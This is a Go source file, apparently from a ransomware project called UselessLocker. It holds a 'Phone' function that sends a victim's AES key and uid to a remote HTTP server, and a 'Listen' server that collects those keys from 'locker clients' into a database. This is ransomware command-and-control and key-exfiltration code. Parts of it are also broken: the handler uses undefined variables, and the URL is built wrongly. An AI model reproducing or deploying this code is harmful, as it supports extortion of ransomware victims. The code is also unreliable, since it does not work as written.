// Package home contains useful functions for reaching out to remote servers on
// the internet
package home

import (
	"net/http"
	"net/url"

	"github.com/TheCreeper/UselessLocker/useless/home/verbs"
	"github.com/syndtr/goleveldb/leveldb"
)

// Phone makes a connection to a http server somewhere on the internet and
// transmits the encrypted AES key along with some identifying information.
func Phone(u, uid, key string) (err error) {
	v, err := url.ParseQuery(u)
	if err != nil {
		return
	}
	v.Add("uid", uid)
	v.Add("key", key)

	resp, err := http.Get(v.Encode())
	if err != nil {
		return
	}
	return resp.Body.Close()
}

type Session struct{ *leveldb.DB }

func (s Session) HandleIndex(w http.ResponseWriter, req *http.Request) {
	// Store the paste in the database.
	if err = s.Put(pname, []byte(val[0]), nil); err != nil {
		http.Error(w,
			http.StatusText(http.StatusBadRequest),
			http.StatusBadRequest)
		return
	}
}

// Listen creates a server and serves incoming requests from locker clients.
func Listen(dbname, addr string) (err error) {
	db, err := leveldb.OpenFile(dbname, nil)
	if err != nil {
		return
	}
	defer db.Close()

	s := Session{db}
	mux := http.NewServeMux()
	mux.Handle("/", verbs.Verbs{Get: s.HandleIndex})
	return http.ListenAndServe(addr, mux)
}
